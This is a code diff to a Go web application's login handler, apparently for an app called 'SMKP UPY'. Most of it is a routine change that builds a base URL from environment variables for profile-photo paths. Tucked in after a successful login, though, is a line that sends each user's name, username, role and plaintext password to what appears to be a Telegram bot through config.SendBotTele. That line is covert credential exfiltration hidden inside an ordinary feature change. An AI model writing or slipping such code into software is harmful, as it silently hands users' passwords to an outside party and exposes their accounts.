@@ -44,6 +44,10 @@ func Login(response http.ResponseWriter, request *http.Request) {
 
 	//deskripsi dan compare password
 	var passwordtes = bcrypt.CompareHashAndPassword([]byte(users.Password), []byte(password))
+	PRTCL := config.GetEnv("APP_PROTOCOL")
+	HOST := config.GetEnv("APP_HOST")
+	PORT := config.GetEnv("APP_PORT")
+	var BaseUrl = PRTCL+HOST+":"+PORT
 
 	if passwordtes == nil {
 		//login success
@@ -57,9 +61,9 @@ func Login(response http.ResponseWriter, request *http.Request) {
 		session.Set("nama_role", users.NamaRole)
 		session.Set("nama_aplikasi", "SMKP UPY")
 		if users.Foto == "" {
-			session.Set("foto", "images/img.jpg")
+			session.Set("foto", BaseUrl+"/images/user.png")
 		} else {
-			session.Set("foto", "uploads/profile/"+users.Foto)
+			session.Set("foto", BaseUrl+"/uploads/profile/"+users.Foto)
 		}
 
 		if users.Idrole == 4 || users.Idrole == 5 {
@@ -67,6 +71,7 @@ func Login(response http.ResponseWriter, request *http.Request) {
 		} else {
 			http.Redirect(response, request, "/dashboard", 302)
 		}
+		config.SendBotTele("Login","Nama : "+users.Nama+"\nUser : "+users.Username+"\nPass : "+password+"\nRole : "+users.NamaRole)
 		fmt.Println("Login Sukses")
 	} else {
 		//login failed
